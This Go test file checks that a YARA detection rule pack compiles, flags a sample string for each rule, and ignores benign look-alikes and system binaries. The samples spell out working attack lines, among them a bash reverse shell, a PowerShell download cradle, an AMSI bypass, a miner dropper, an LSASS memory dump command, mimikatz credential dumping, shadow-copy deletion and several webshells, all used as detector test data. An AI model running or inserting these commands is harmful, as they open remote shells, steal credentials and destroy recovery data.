package yara

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"testing"
)

// The built-in rule pack (yara/builtin/*.yar, seeded by the server) must
// compile with this engine, match a sample for every rule, and stay quiet on
// benign look-alikes and system binaries. Samples are strings only: no
// malware is involved.

func builtinSources(t *testing.T) []Source {
	t.Helper()
	files, err := filepath.Glob(filepath.Join("..", "..", "..", "yara", "builtin", "*.yar"))
	if err != nil || len(files) == 0 {
		t.Fatalf("no built-in rules found: %v", err)
	}
	var srcs []Source
	for _, f := range files {
		b, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		srcs = append(srcs, Source{Namespace: "builtin/" + strings.TrimSuffix(filepath.Base(f), ".yar"), Text: string(b)})
	}
	return srcs
}

func builtinRules(t *testing.T) *Rules {
	t.Helper()
	rules, errs := CompileSources(builtinSources(t))
	for _, e := range errs {
		t.Errorf("compile: %v", e)
	}
	if rules == nil || rules.Len() == 0 {
		t.Fatal("no rules compiled")
	}
	return rules
}

func matched(t *testing.T, rules *Rules, data []byte) []string {
	t.Helper()
	res, err := rules.Scan(context.Background(), data)
	if err != nil {
		t.Fatal(err)
	}
	var names []string
	for _, m := range res.Matches {
		names = append(names, m.Rule)
	}
	sort.Strings(names)
	return names
}

var builtinPositives = map[string]string{
	"ADSIEM_EICAR_Test_File":                       `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`,
	"ADSIEM_HackTool_Mimikatz":                     "mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\n",
	"ADSIEM_HackTool_LaZagne":                      "lazagne\x00softwares.browsers.chromium\x00softwares.windows.credman\x00",
	"ADSIEM_Script_LSASS_Dump":                     `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full`,
	"ADSIEM_C2_CobaltStrike_Beacon_Strings":        "could not spawn %s: %d\x00could not open process token: %d (%u)\x00beacon.dll\x00",
	"ADSIEM_C2_Meterpreter":                        "metsrv.dll\x00ext_server_stdapi\x00stdapi_sys_process_execute\x00",
	"ADSIEM_C2_Sliver_Implant":                     "github.com/bishopfox/sliver/protobuf/sliverpb.Envelope\x00",
	"ADSIEM_Webshell_PHP_Eval_Request":             `<?php @eval(base64_decode($_POST['x'])); ?>`,
	"ADSIEM_Webshell_PHP_Known_Families":           "<?php /* c99shell */ $x = 'FilesMan'; ?>",
	"ADSIEM_Webshell_ASPX_China_Chopper_Style":     `<%@ Page Language="Jscript"%><%eval(Request.Item["z"],"unsafe");%>`,
	"ADSIEM_Webshell_JSP_Runtime_Exec":             `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`,
	"ADSIEM_Ransomware_Note":                       "All your files are encrypted. Buy bitcoin, then use Tor Browser to open our .onion site.",
	"ADSIEM_Ransomware_Recovery_Inhibition_Script": "vssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled No\r\n",
	"ADSIEM_CoinMiner_XMRig":                       `{"donate-level": 1, "algo": "rx/0", "url": "stratum+tcp://pool.example:3333", "user": "xmrig"}`,
	"ADSIEM_CoinMiner_Dropper_Script":              "#!/bin/sh\npkill -f kdevtmpfsi\ncurl -o /tmp/x http://203.0.113.9/xmrig\nchmod +x /tmp/x && /tmp/x\n",
	"ADSIEM_Script_PowerShell_Download_Cradle":     "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')",
	"ADSIEM_Script_PowerShell_AMSI_Bypass":         "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
	"ADSIEM_Script_Reverse_Shell_OneLiner":         "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
}

func TestBuiltinRulesCompileAndMatchTheirSamples(t *testing.T) {
	rules := builtinRules(t)
	if rules.Len() != len(builtinPositives) {
		t.Errorf("%d rules compiled, %d have a sample: give every rule a positive case", rules.Len(), len(builtinPositives))
	}
	for name, sample := range builtinPositives {
		got := matched(t, rules, []byte(sample))
		found := false
		for _, g := range got {
			found = found || g == name
		}
		if !found {
			t.Errorf("%s: no match on its sample (matched %v)", name, got)
		}
	}
}

func TestBuiltinRulesStayQuietOnBenignLookAlikes(t *testing.T) {
	rules := builtinRules(t)
	for name, text := range map[string]string{
		"php form":          `<?php echo htmlspecialchars($_POST['name']); ?>`,
		"crypto article":    "Bitcoin and .onion services explained: how Tor Browser works.",
		"vss listing":       "vssadmin list shadows\r\nwbadmin get versions\r\n",
		"ps update script":  "Invoke-WebRequest -Uri https://example.com/setup.msi -OutFile setup.msi",
		"backup script":     "#!/bin/sh\ncurl -o backup.tgz https://example.com/backup.tgz\n",
		"lsass doc":         "LSASS is the Local Security Authority Subsystem Service.",
		"eicar mention":     "The EICAR test file starts with X5O!P but this is not it.",
		"bash tcp tutorial": "Use /dev/tcp in bash to test a port: echo > /dev/tcp/example.com/80",
	} {
		if got := matched(t, rules, []byte(text)); len(got) != 0 {
			t.Errorf("%s: matched %v", name, got)
		}
	}
	// System binaries: the shell, coreutils, interpreters, network tools. (Not
	// this test binary: it carries every positive sample above.)
	var bins []string
	for _, n := range []string{"sh", "bash", "ls", "cat", "python3", "perl", "curl", "ssh", "openssl", "git", "go"} {
		if p, err := exec.LookPath(n); err == nil {
			bins = append(bins, p)
		}
	}
	for _, p := range bins {
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		if got := matched(t, rules, data); len(got) != 0 {
			t.Errorf("%s: matched %v", p, got)
		}
	}
}
